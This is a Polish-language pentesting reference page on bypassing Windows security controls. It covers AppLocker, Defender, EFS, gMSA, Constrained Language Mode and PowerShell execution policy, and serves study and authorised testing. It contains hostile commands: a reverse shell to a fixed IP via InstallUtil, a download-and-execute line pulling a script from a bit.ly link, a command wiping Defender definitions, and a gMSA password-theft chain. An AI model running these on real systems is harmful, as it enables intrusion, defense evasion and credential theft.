# Kontrole bezpieczeństwa Windows

{{#include ../../banners/hacktricks-training.md}}

## Zasady AppLocker

Lista dozwolonych aplikacji to wykaz zatwierdzonych aplikacji lub plików wykonywalnych, które mogą znajdować się w systemie i być w nim uruchamiane. Jej celem jest ochrona środowiska przed szkodliwym malware i niezatwierdzonym oprogramowaniem, które nie odpowiada konkretnym potrzebom biznesowym organizacji.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) to **rozwiązanie firmy Microsoft do tworzenia list dozwolonych aplikacji**, które daje administratorom systemu kontrolę nad tym, **które aplikacje i pliki mogą uruchamiać użytkownicy**. Zapewnia **szczegółową kontrolę** nad plikami wykonywalnymi, skryptami, plikami instalacyjnymi Windows, bibliotekami DLL, aplikacjami pakietowymi i instalatorami aplikacji pakietowych.\
Organizacje często **blokują cmd.exe i PowerShell.exe** oraz dostęp do zapisu w określonych katalogach, **ale można to wszystko obejść**.

### Sprawdzenie

Sprawdź, które pliki/rozszerzenia są na czarnej/białej liście:

```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

Ta ścieżka rejestru zawiera konfiguracje i zasady stosowane przez AppLocker, dzięki czemu można sprawdzić aktualny zestaw reguł egzekwowanych w systemie:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Przydatne **zapisywalne foldery** do ominięcia zasad AppLocker: Jeśli AppLocker zezwala na uruchamianie dowolnych plików z `C:\Windows\System32` lub `C:\Windows`, możesz użyć **zapisywalnych folderów**, aby **ominąć te zasady**.

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

- Powszechnie **zaufane** pliki binarne [**"LOLBAS's"**](https://lolbas-project.github.io/) również mogą być przydatne do ominięcia AppLocker.
- **Źle napisane reguły również można obejść**
  - Na przykład **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** — możesz utworzyć **folder o nazwie `allowed`** w dowolnym miejscu, a zostanie on dozwolony.
  - Organizacje często skupiają się też na **blokowaniu pliku wykonywalnego `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, ale zapominają o **innych** [**lokalizacjach plików wykonywalnych PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), takich jak `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` lub `PowerShell_ISE.exe`.
- **Wymuszanie reguł dla DLL jest bardzo rzadko włączane** ze względu na dodatkowe obciążenie systemu i zakres testów potrzebnych do upewnienia się, że nic nie przestanie działać. Używanie **DLL jako backdoorów może więc pomóc w ominięciu AppLocker**.
- Możesz użyć [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) lub [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick), aby **wykonywać** kod **Powershell** w dowolnym procesie i ominąć AppLocker. Więcej informacji: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Przechowywanie poświadczeń

### Menedżer kont zabezpieczeń (SAM)

Lokalne poświadczenia znajdują się w tym pliku; hasła są zahashowane.

### Lokalny urząd zabezpieczeń (LSA) — LSASS

**Poświadczenia** (zahashowane) są **zapisywane** w **pamięci** tego podsystemu w celu obsługi Single Sign-On.\
**LSA** zarządza lokalnymi **zasadami zabezpieczeń** (zasadami haseł, uprawnieniami użytkowników...), **uwierzytelnianiem**, **tokenami dostępu**...\
LSA **sprawdza** podane poświadczenia w pliku **SAM** (przy logowaniu lokalnym) i **komunikuje się** z **kontrolerem domeny**, aby uwierzytelnić użytkownika domeny.

**Poświadczenia** są **zapisywane** w **procesie LSASS**: bilety Kerberos, hashe NT i LM, łatwe do odszyfrowania hasła.

### Sekrety LSA

LSA może zapisywać niektóre poświadczenia na dysku:

- Hasło konta komputera w Active Directory (niedostępny kontroler domeny).
- Hasła kont usług Windows
- Hasła zadań zaplanowanych
- Więcej (hasło aplikacji IIS...)

### NTDS.dit

Jest to baza danych Active Directory. Występuje tylko na kontrolerach domeny.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) to program antywirusowy dostępny w systemach Windows 10 i Windows 11 oraz w wersjach Windows Server. **Blokuje** popularne narzędzia pentestingowe, takie jak **`WinPEAS`**. Istnieją jednak sposoby na **ominięcie tych zabezpieczeń**.

### Sprawdzanie

Aby sprawdzić **stan** programu **Defender**, możesz uruchomić polecenie cmdlet PS **`Get-MpComputerStatus`** (sprawdź wartość **`RealTimeProtectionEnabled`**, aby ustalić, czy ochrona jest aktywna):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Możesz też uruchomić poniższe polecenie, aby przeprowadzić enumerację:

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Encrypted File System (EFS)

EFS zabezpiecza pliki za pomocą szyfrowania, wykorzystując **klucz symetryczny** znany jako **File Encryption Key (FEK)**. Klucz ten jest szyfrowany **kluczem publicznym** użytkownika i przechowywany w **alternatywnym strumieniu danych** $EFS zaszyfrowanego pliku. Gdy potrzebne jest odszyfrowanie, **klucz prywatny** odpowiadający certyfikatowi cyfrowemu użytkownika służy do odszyfrowania FEK ze strumienia $EFS. Więcej szczegółów można znaleźć [tutaj](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Scenariusze odszyfrowania bez inicjatywy użytkownika** obejmują:

- Pliki lub foldery przeniesione do systemu plików bez obsługi EFS, takiego jak [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), są automatycznie odszyfrowywane.
- Zaszyfrowane pliki wysyłane przez sieć za pomocą protokołu SMB/CIFS są odszyfrowywane przed transmisją.

Ta metoda szyfrowania zapewnia właścicielowi **przejrzysty dostęp** do zaszyfrowanych plików. Jednak samo zmienienie hasła właściciela i zalogowanie się nie umożliwi odszyfrowania plików.

**Najważniejsze informacje**:

- EFS używa symetrycznego FEK, zaszyfrowanego kluczem publicznym użytkownika.
- Do odszyfrowania FEK używany jest klucz prywatny użytkownika.
- Automatyczne odszyfrowanie następuje w określonych warunkach, na przykład podczas kopiowania do FAT32 lub transmisji przez sieć.
- Właściciel ma dostęp do zaszyfrowanych plików bez wykonywania dodatkowych czynności.

### Sprawdzanie informacji o EFS

Sprawdź, czy **użytkownik** **korzystał** z tej **usługi**, sprawdzając, czy istnieje ta ścieżka:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Sprawdź, **kto** ma **dostęp** do pliku, używając cipher /c \<file>\
Możesz też użyć `cipher /e` i `cipher /d` w folderze, aby **zaszyfrować** i **odszyfrować** wszystkie pliki

### Odszyfrowywanie plików EFS

#### Działanie jako Authority System

Ta metoda wymaga, aby **użytkownik będący ofiarą** miał **uruchomiony** **proces** na hoście. Jeśli tak jest, używając sesji `meterpreter`, możesz podszyć się pod token procesu użytkownika (`impersonate_token` z `incognito`). Możesz też po prostu wykonać `migrate` do procesu użytkownika.

#### Znajomość hasła użytkownika

Dokumentacja Mimikatz opisuje, jak zaimportować certyfikat/klucz prywatny użytkownika i odszyfrować pliki chronione przez EFS, gdy znane jest hasło.<sup>[[6]](#references)</sup>

## Group Managed Service Accounts (gMSA)

Firma Microsoft opracowała **Group Managed Service Accounts (gMSA)**, aby uprościć zarządzanie kontami usług w infrastrukturach IT. W przeciwieństwie do tradycyjnych kont usług, dla których często włączone jest ustawienie „**Password never expire**”, gMSA oferują bezpieczniejsze i łatwiejsze w zarządzaniu rozwiązanie:

- **Automatyczne zarządzanie hasłami**: gMSA używają złożonego, 240-znakowego hasła, które zmienia się automatycznie zgodnie z zasadami domeny lub komputera. Proces ten obsługuje usługa Key Distribution Service (KDC) firmy Microsoft, eliminując potrzebę ręcznej aktualizacji haseł.
- **Zwiększone bezpieczeństwo**: tych kont nie można zablokować ani używać do logowania interaktywnego, co zwiększa ich bezpieczeństwo.
- **Obsługa wielu hostów**: gMSA można współdzielić między wieloma hostami, dzięki czemu idealnie nadają się do usług działających na wielu serwerach.
- **Obsługa zaplanowanych zadań**: w przeciwieństwie do zarządzanych kont usług, gMSA obsługują uruchamianie zaplanowanych zadań.
- **Uproszczone zarządzanie SPN**: system automatycznie aktualizuje Service Principal Name (SPN), gdy zmienią się dane sAMaccount komputera lub jego nazwa DNS, upraszczając zarządzanie SPN.

Hasła gMSA są przechowywane we właściwości LDAP _**msDS-ManagedPassword**_ i automatycznie resetowane co 30 dni przez kontrolery domeny (DC). Hasło to, czyli zaszyfrowany blob danych znany jako [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), mogą pobierać wyłącznie upoważnieni administratorzy oraz serwery, na których zainstalowano gMSA, co zapewnia bezpieczne środowisko. Aby uzyskać dostęp do tych informacji, wymagane jest bezpieczne połączenie, takie jak LDAPS, albo uwierzytelnienie połączenia z użyciem „Sealing & Secure”.

![Przekazywanie uwierzytelniania NTLM w celu pobrania hasła gMSA](../../images/asd1.png)<sup>[[1]](#references)</sup>

To hasło można odczytać za pomocą [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup>

```
/GMSAPasswordReader --AccountName jkohler
```

[**Więcej informacji znajdziesz w zarchiwizowanym oryginalnym opracowaniu**](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/).<sup>[[1]](#references)</sup>

W tym samym opracowaniu wyjaśniono, jak **atak NTLM relay** może umożliwić uzyskanie **hasła gMSA**, gdy relayed principal ma uprawnienia do odczytu `msDS-ManagedPassword`.<sup>[[1]](#references)</sup>

### Nadużycie łańcuchowania ACL w celu odczytu hasła zarządzanego gMSA (GenericAll -> ReadGMSAPassword)

W wielu środowiskach użytkownicy z niskimi uprawnieniami mogą uzyskać dostęp do sekretów gMSA bez kompromitacji DC, nadużywając błędnie skonfigurowanych ACL obiektów:<sup>[[3]](#references)</sup>

- Grupa, którą możesz kontrolować (np. za pomocą GenericAll/GenericWrite), otrzymuje uprawnienie `ReadGMSAPassword` do gMSA.
- Dodając się do tej grupy, uzyskujesz prawo do odczytu atrybutu `msDS-ManagedPassword` gMSA przez LDAP i wyprowadzenia przydatnych poświadczeń NTLM.

Typowy przebieg:

1) Znajdź ścieżkę za pomocą BloodHound i oznacz swoje główne konta jako Owned. Szukaj krawędzi takich jak:
   - GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Dodaj się do kontrolowanej przez siebie grupy pośredniej (przykład z bloodyAD):

```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```

3) Odczytaj zarządzane hasło gMSA przez LDAP i wyprowadź hash NTLM. NetExec automatyzuje pobieranie `msDS-ManagedPassword` i konwersję do NTLM:

```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```

4) Uwierzytelnij się jako gMSA za pomocą skrótu NTLM (hasło w postaci jawnej nie jest potrzebne). Jeśli konto należy do grupy Remote Management Users, WinRM zadziała bezpośrednio:

```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```

Uwagi:
- Odczyt `msDS-ManagedPassword` przez LDAP wymaga szyfrowania (np. LDAPS/sign+seal). Narzędzia obsługują to automatycznie.
- gMSA często mają przyznane lokalne uprawnienia, takie jak WinRM; sprawdź członkostwo w grupach (np. Remote Management Users), aby zaplanować lateral movement.
- Jeśli potrzebujesz tylko blobu, by samodzielnie obliczyć NTLM, zobacz strukturę MSDS-MANAGEDPASSWORD_BLOB.

Inną ścieżką ACL jest przyznanie uprawnień do zapisu samego obiektu gMSA. `msDS-GroupMSAMembership` to deskryptor zabezpieczeń używany do określenia, które podmioty mogą pobrać zarządzane hasło. Jego GUID schematu to `888eedd6-ce04-df40-b462-b8a50e41ba38`. Dokładny ACE `WriteProperty` dla tego atrybutu, przyznany grupie, nad którą masz kontrolę, może umożliwić zmianę listy podmiotów uprawnionych do odczytu; to coś innego niż samo znajdowanie się na tej liście. Przed uznaniem tej ścieżki za możliwą do wykorzystania sprawdź całą DACL, wpisy deny i dziedziczone ACE oraz efektywne uprawnienia. Po dodaniu członkostwa do grupy przed próbą odczytu hasła wymagane jest odświeżenie tokenu/sesji.<sup>[[7]](#references)</sup>



## LAPS

**Local Administrator Password Solution (LAPS)**, dostępne do pobrania ze strony [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), umożliwia zarządzanie hasłami lokalnego Administratora. Hasła te są **losowe**, unikatowe i **regularnie zmieniane**, a następnie przechowywane centralnie w Active Directory. Dostęp do tych haseł jest ograniczony za pomocą ACL do upoważnionych użytkowników. Przyznanie odpowiednich uprawnień umożliwia odczyt haseł lokalnego administratora.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **ogranicza wiele funkcji** niezbędnych do efektywnego korzystania z PowerShella, takich jak blokowanie obiektów COM, dopuszczanie wyłącznie zatwierdzonych typów .NET, przepływów pracy opartych na XAML, klas PowerShell i innych.

### **Sprawdź**

```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Bypass

```bash
#Easy bypass
Powershell -version 2
```

W obecnych wersjach Windows ten bypass już nie działa, ale możesz użyć [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Aby go skompilować, może być konieczne** **dodanie** _**odwołania**_ -> _Przeglądaj_ ->_Przeglądaj_ -> dodaj `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` i **zmień projekt na .Net4.5**.

#### Bezpośredni bypass:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Reverse shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

Możesz użyć [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) lub [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick), aby **wykonywać** kod Powershell w dowolnym procesie i ominąć tryb ograniczony. Więcej informacji: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Zasady wykonywania PS

Domyślnie ustawiona jest wartość **restricted.** Główne sposoby obejścia tej polityki:

```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

Więcej informacji można znaleźć [tutaj](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup>

## Security Support Provider Interface (SSPI)

To API, którego można używać do uwierzytelniania użytkowników.

SSPI wybiera odpowiedni protokół uwierzytelniania dla dwóch komunikujących się maszyn, preferując Kerberos, jeśli jest dostępny. Protokoły te są implementowane przez Security Support Providers (SSP), instalowane w systemie Windows jako biblioteki DLL; obie strony muszą obsługiwać wynegocjowanego dostawcę.

### Główne SSP

- **Kerberos**: preferowany
  - %windir%\Windows\System32\kerberos.dll
- **NTLMv1** i **NTLMv2**: ze względu na kompatybilność
  - %windir%\Windows\System32\msv1_0.dll
- **Digest**: serwery WWW i LDAP, hasło w postaci skrótu MD5
  - %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL i TLS
  - %windir%\Windows\System32\Schannel.dll
- **Negotiate**: służy do negocjowania używanego protokołu (Kerberos lub NTLM; domyślnie wybierany jest Kerberos)
  - %windir%\Windows\System32\lsasrv.dll

#### Negocjacja może obejmować kilka metod albo tylko jedną.

## UAC - Kontrola konta użytkownika

[Kontrola konta użytkownika (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) to funkcja, która wyświetla **monit o zgodę na działania wymagające podwyższonych uprawnień**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [Relaying dla gMSA – cube0x0 (Internet Archive)](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: gMSA przez łańcuchowanie uprawnień do WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – Bypassing AppLocker and PowerShell Constrained Language Mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [5] [NetSPI – 15 sposobów na ominięcie zasad wykonywania PowerShell](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ odszyfrowywanie plików EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [7] [Microsoft - atrybut ms-DS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
{{#include ../../banners/hacktricks-training.md}}
